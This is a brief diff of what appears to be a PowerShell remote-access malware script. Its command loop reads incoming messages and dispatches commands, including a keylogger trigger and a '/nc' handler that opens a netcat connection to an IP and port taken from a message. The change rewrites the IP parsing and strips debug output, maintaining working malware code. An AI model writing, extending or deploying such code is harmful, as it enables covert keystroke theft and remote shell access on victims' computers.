@@ -733,15 +733,13 @@ While ($DoNotExit)  {
         keylogger seconds $time
       }
       "/nc $ipV4 *"{
-        $ip = ($LastMessageText -split "/nc $ipV4 ")[1]
-
+        $ip = $LastMessageText -replace "/nc $ipV4 ", ""
+	
         if ($ip -match $ipv4Regex) {
             $port = $ip -replace '\s*$', ''
             netcat $ip $port
         } else {
             Write-Host "Invalid IPv4 address format."
-	    Write-Host "$ip"
-	    Write-Host "$port"
 	}
       }
       "/stopnc $ipV4"{
